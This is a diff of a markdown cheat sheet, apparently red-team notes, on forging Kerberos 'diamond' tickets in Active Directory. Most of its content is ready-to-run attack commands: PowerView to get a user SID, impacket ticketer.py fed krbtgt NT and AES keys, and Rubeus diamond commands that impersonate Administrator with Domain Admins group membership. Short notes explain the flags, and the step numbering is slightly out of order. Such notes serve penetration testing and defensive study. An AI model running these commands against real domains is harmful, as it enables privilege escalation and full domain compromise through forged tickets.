@@ -20,12 +20,20 @@
 
 ### 1) Get user SID
 
- - powershell Get-DomainUser -Identity USERNAME -Properties objectsid
+    powershell Get-DomainUser -Identity USERNAME -Properties objectsid
 
- - 1) ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
+1)
+
+      ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
   
- - 2) .\Rubeus.exe diamond /tgtdeleg /ticketuser:USERNAME /ticketuserid:RID_OF_USERNAME /groups:512
-  
+4)
+
+      .\Rubeus.exe diamond /tgtdeleg /ticketuser:USERNAME /ticketuserid:RID_OF_USERNAME /groups:512
+
+OR 
+
+    .\Rubeus.exe diamond /krbkey:<aes_krbtgt_key> /user:user1 /password:password /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:Administrator /ticketuserid:<target_RID> /groups:512 /nowrap
+
 ### /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
 
 ### /ticketuser is the username of the principal to impersonate.
